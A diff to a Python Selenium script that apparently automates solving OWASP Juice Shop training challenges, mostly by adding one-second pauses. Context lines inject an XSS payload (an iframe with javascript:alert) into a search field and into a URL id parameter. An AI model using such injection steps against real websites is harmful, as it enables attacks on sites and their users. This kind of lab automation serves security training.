@@ -19,11 +19,17 @@ def scoreboard(driver, wait, url_address):
 def dom_xss(driver, wait, url_address):
     open_homepage_and_wait_for_juiceshop_logo(driver, url_address, wait)
     wait_for_element_to_be_clickable_and_click_by_css_selector(wait, 'mat-icon.mat-ripple:nth-child(2)')
+    sleep(1)
     wait_for_element_to_be_clickable_by_css_selector(wait, '#mat-input-0')
+    sleep(1)
     write_text_and_press_enter(driver, '#mat-input-0', '<iframe src="javascript:alert(`xss`)">')
+    sleep(1)
     wait.until(EC.alert_is_present())
+    sleep(1)
     driver.switch_to.alert.accept()
+    sleep(1)
     wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
+    sleep(1)
  
 def bonus_payload(driver, wait, url_address):
     open_homepage_and_wait_for_juiceshop_logo(driver, url_address, wait)
@@ -202,6 +208,7 @@ def view_basket(driver, wait, url_address):
     wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
     refresh_url(driver)
     wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
+    sleep(1)
 
 def deprecated_interface(driver, wait, url_address):
     open_url(driver, f'{url_address}/#/complain')
@@ -271,10 +278,13 @@ def reflected_xss(driver, wait, url_address):
     current_url = driver.current_url
     new_url = sub(r'id=[^&]*', 'id=<iframe src="javascript:alert(`xss`)">', current_url)
     driver.get(new_url)
+    sleep(1)
     driver.refresh()
-    
+    sleep(1)
     wait.until(EC.alert_is_present())
+    sleep(1)
     driver.switch_to.alert.accept()
+    sleep(1)
     wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
 
 def meta_geo_stalking(driver, wait, url_address):
